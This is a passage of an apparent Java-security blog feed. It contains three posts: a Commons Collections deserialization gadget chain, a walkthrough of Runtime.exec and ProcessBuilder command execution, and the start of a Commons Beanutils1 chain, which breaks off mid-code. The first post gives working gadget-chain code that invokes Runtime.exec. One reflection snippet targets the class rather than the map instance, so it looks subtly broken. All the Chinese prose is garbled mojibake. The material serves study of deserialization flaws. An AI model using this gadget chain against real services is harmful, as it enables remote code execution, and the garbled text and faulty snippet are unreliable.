class="line">HashSet.readObject()-&gt;HashMap.put()-&gt;HashMap.hash()-&gt;TiedMapEntry.hashCode()-&gt;TiedMapEntry.getValue()-&gt;LazyMap.get()</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å…¥å£å…¶å®å°±èƒ½æƒ³åˆ° <code>URLDNS</code></p><p>æ‰€ä»¥è¿™ä¸€æ®µçš„ä»£ç å†™ä¸‹æ¥å°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ki10Moc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, <span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">finalmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        finalmap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ç‚¹å°é—®é¢˜ï¼Œå°±æ˜¯ debug çš„æ—¶å€™ä¼šç›´æ¥å¼¹å‡ºè®¡ç®—å™¨<br>åŸå› æ˜¯å±•ç¤ºå¯¹è±¡é›†åˆï¼ŒIDEA ä¼šè‡ªåŠ¨è°ƒç”¨ <code>toString()</code>  æ–¹æ³•ï¼Œå¯ä»¥åœ¨è®¾ç½®ä¸­å…³é—­<br><img src="https://img-blog.csdnimg.cn/8a5596b881af44f9a059d9c835b122d3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜æœ‰ä¸ªé—®é¢˜â€¦<br> åœ¨ <code>Map,put()</code>  çš„æ—¶å€™ä¸ºäº†é˜²æ­¢ç›´æ¥è§¦å‘ RCE<br> è¿™é‡ŒåŒ…è£…åˆ° <code>map</code>  çš„å‚æ•° <code>chainedTransformer</code>  å¯ä»¥å†™æˆå…¶ä»–çš„<br>åœ¨ <code>LazyMap.decorate</code>  çš„ factory å‚æ•°å¯ä»¥å†™æˆ <code>new ConstantTransformer(&quot;xxx&quot;)</code>  æˆ– <code>new ConstantTransformer(1)</code></p><p><img src="https://img-blog.csdnimg.cn/aee065b8a34d4564806a179cf7c56c84.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åé¢å†é€šè¿‡åå°„è°ƒç”¨ï¼Œä¿®æ”¹ <code>factiry</code>  çš„å€¼ä¸º <code>chainedTransformer</code> <br> å³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line"> factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> factoryField.set(lazyMapClass, chainedTransformer);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#å‰è¨€&quot;&gt;#&lt;/a&gt; å‰è¨€&lt;/h2&gt;
&lt;p&gt;Java 8u71 ä»¥åï¼Œsun.reflect.annotation.AnnotationInvocationHandler#readObj</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Javaå‘½ä»¤æ‰§è¡Œ</title>
    <link href="https://ki10moc.github.io/2022/12/23/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://ki10moc.github.io/2022/12/23/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2022-12-23T06:17:36.000Z</published>
    <updated>2023-05-22T07:13:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="windows"><a class="markdownIt-Anchor" href="#windows">#</a> Windows</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span><span class="string">&quot;cmd /c echo 1 &gt; 1.txt&quot;</span>;</span><br><span class="line">            process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;gbk&quot;</span>)));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯¹æ‰§è¡Œçš„ command åˆ¤æ–­ï¼Œéç©ºåè¿›è¡Œè¯†åˆ«<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513067.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¶ä¸­ <code>StringTokenizer</code>  é»˜è®¤æ˜¯ç©ºæ ¼åˆ†éš”<br>å†å­˜å…¥æ•°ç»„<br><img src="https://img-blog.csdnimg.cn/e170a02c319249069a9c3ee81d2d1306.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸€ç›´åˆ° exec è¿”å›å€¼<br>æ¥çœ‹ä¸‹è¿™ä¸‰ä¸ªå€¼çš„å«ä¹‰<br><img src="https://img-blog.csdnimg.cn/afc62f593e0240c2b63a9a6095c064cc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513112.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¼šå‘ç°ï¼Œå…¶å®åº•å±‚è¿˜æ˜¯ä½¿ç”¨ <code>ProcessBuilder.start</code>  æ¥æ‰§è¡Œåˆšæ‰æ‹¿åˆ°çš„ <code>cmdarray</code> <br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513864.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å­˜å…¥ <code>prog</code> ï¼Œä¹Ÿå°±æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤<br>ç„¶ååˆ¤æ–­ <code>security</code>  æ˜¯å¦ä¸ºç©ºï¼Œæ˜¯åˆ™ç»§ç»­è¿›è¡Œï¼Œå¦åˆ™è°ƒç”¨ <code>SecurityManager.checkExec</code>  æ£€éªŒ <code>prog</code> <br> æ‰§è¡Œçš„å‘½ä»¤ä¸èƒ½æ˜¯ç©ºæ ¼å¼€å¤´ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// Must convert to array first -- a malicious user-supplied</span></span><br><span class="line">        <span class="comment">// list might try to circumvent the security check.</span></span><br><span class="line">        String[] cmdarray = command.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[command.size()]);</span><br><span class="line">        cmdarray = cmdarray.clone();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String arg : cmdarray)</span><br><span class="line">            <span class="keyword">if</span> (arg == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="comment">// Throws IndexOutOfBoundsException if command is empty</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">prog</span> <span class="operator">=</span> cmdarray[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>)</span><br><span class="line">            security.checkExec(prog);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> directory == <span class="literal">null</span> ? <span class="literal">null</span> : directory.toString();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; cmdarray.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cmdarray[i].indexOf(<span class="string">&#x27;\u0000&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;invalid null character in command&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ProcessImpl.start(cmdarray,</span><br><span class="line">                                     environment,</span><br><span class="line">                                     dir,</span><br><span class="line">                                     redirects,</span><br><span class="line">                                     redirectErrorStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">exceptionInfo</span> <span class="operator">=</span> <span class="string">&quot;: &quot;</span> + e.getMessage();</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e;</span><br><span class="line">            <span class="keyword">if</span> ((e <span class="keyword">instanceof</span> IOException) &amp;&amp; security != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Can not disclose the fail reason for read-protected files.</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    security.checkRead(prog);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                    exceptionInfo = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    cause = se;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// It&#x27;s much easier for us to create a high-quality error</span></span><br><span class="line">            <span class="comment">// message than the low-level C code which found the problem.</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(</span><br><span class="line">                <span class="string">&quot;Cannot run program \&quot;&quot;</span> + prog + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">                + (dir == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : <span class="string">&quot; (in directory \&quot;&quot;</span> + dir + <span class="string">&quot;\&quot;)&quot;</span>)</span><br><span class="line">                + exceptionInfo,</span><br><span class="line">                cause);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œçš„å‘½ä»¤å‰åŠ ä¸Š <code>cmd /c</code>  å®é™…ä¸Šæ˜¯å‘Šè¯‰è®¡ç®—æœºæ­¤æ—¶çš„ç¯å¢ƒå˜é‡</p><h3 id="linux"><a class="markdownIt-Anchor" href="#linux">#</a> Linux</h3><p><code>ProcessBuilder</code>  ä¸‹çš„æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ„å»ºä¸€ä¸ªå…·æœ‰æŒ‡å®šæ“ä½œç³»ç»Ÿå’Œå‚æ•°çš„è¿›ç¨‹æ„å»ºå™¨ã€‚</span></span><br><span class="line"><span class="comment">     * ç³»ç»Ÿç¨‹åºå’Œå‚æ•°ã€‚ è¿™æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„</span></span><br><span class="line"><span class="comment">     * æ„å»ºå™¨ï¼Œå®ƒå°†è¿›ç¨‹æ„å»ºå™¨çš„å‘½ä»¤è®¾ç½®ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">     * åŒ…å«ä¸&#123;<span class="doctag">@code</span> command&#125;ç›¸åŒçš„å­—ç¬¦ä¸²çš„åˆ—è¡¨ã€‚</span></span><br><span class="line"><span class="comment">     * æ•°ç»„ï¼Œé¡ºåºç›¸åŒã€‚ å®ƒå¹¶ä¸æ£€æŸ¥æ˜¯å¦</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> command&#125;æ˜¯å¦å¯¹åº”äºä¸€ä¸ªæœ‰æ•ˆçš„æ“ä½œç³»ç»Ÿ</span></span><br><span class="line"><span class="comment">     * å‘½ä»¤ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> command ä¸€ä¸ªåŒ…å«ç¨‹åºåŠå…¶å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.command = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(command.length);</span><br><span class="line">        <span class="keyword">for</span> (String arg : command)</span><br><span class="line">            <span class="built_in">this</span>.command.add(arg);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¼ å…¥å‚æ•°æ˜¯å­—ç¬¦ä¸²æ•°ç»„ï¼Œå‚æ•°ä¸ä¼šè¢« <code>StringTokenizer</code>  å½±å“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeExec</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 111 &gt; 3.txt&quot;</span>&#125;;</span><br><span class="line">            process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;gbk&quot;</span>)));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;windows&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#windows&quot;&gt;#&lt;/a&gt; Windows&lt;/h3&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Commons Beanutils1</title>
    <link href="https://ki10moc.github.io/2022/11/23/Commons%20Beanutils1/"/>
    <id>https://ki10moc.github.io/2022/11/23/Commons%20Beanutils1/</id>
    <published>2022-11-22T17:28:36.000Z</published>
    <updated>2023-07-15T13:07:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="apache-commons-beanutils"><a class="markdownIt-Anchor" href="#apache-commons-beanutils">#</a> Apache Commons Beanutils</h2><p>Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€š Java ç±»å¯¹<br>è±¡ï¼ˆä¹Ÿç§°ä¸º JavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚</p><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ…å«ç§æœ‰å±æ€§ <code>name</code> ï¼Œä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªè¯»å–ä¸€ä¸ªè®¾ç½®<br> <code>getxxx</code> -&gt; <code>getter</code> ï¼Œ <code>setxxx</code> -&gt; <code>setter</code> ï¼Œå…¨åç¬¦åˆéª†é©¼å¼å‘½åæ³•</p><p>å…¶ä¸­ <code>commons-beanutils</code>  ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•  <code>PropertyUtils.getProperty</code> ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»<br>æ„ JavaBean çš„ getter æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Cat</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>commons-beanutils</code>  è¿˜ä¼šè‡ªåŠ¨è°ƒç”¨ <code>name</code>  å±æ€§çš„ <code>getter</code>  æ–¹æ³•ã€‚<br> <code>PropertyUtils.getProperty</code>  è¿˜æ”¯æŒé€’å½’è·å–å±æ€§<br>ä¾‹å¦‚ <code>a</code>  å¯¹è±¡ä¸­æœ‰ <code>b</code>  å±æ€§ï¼Œ <code>b</code>  ä¸­æœ‰ <code>c</code> ï¼Œé‚£å°±å¯ä»¥é€šè¿‡ <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code>  é€’å½’è·å–å¯¹è±¡ã€‚</p><p>æ¥çœ‹ä¸‹ <code>org.apache.commons.beanutils.BeanComparator</code>  ä¸‹çš„ <code>compare</code>  æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( T o1, T o2 )</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">            <span class="comment">// compare the actual objects</span></span><br><span class="line">            <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">            <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span 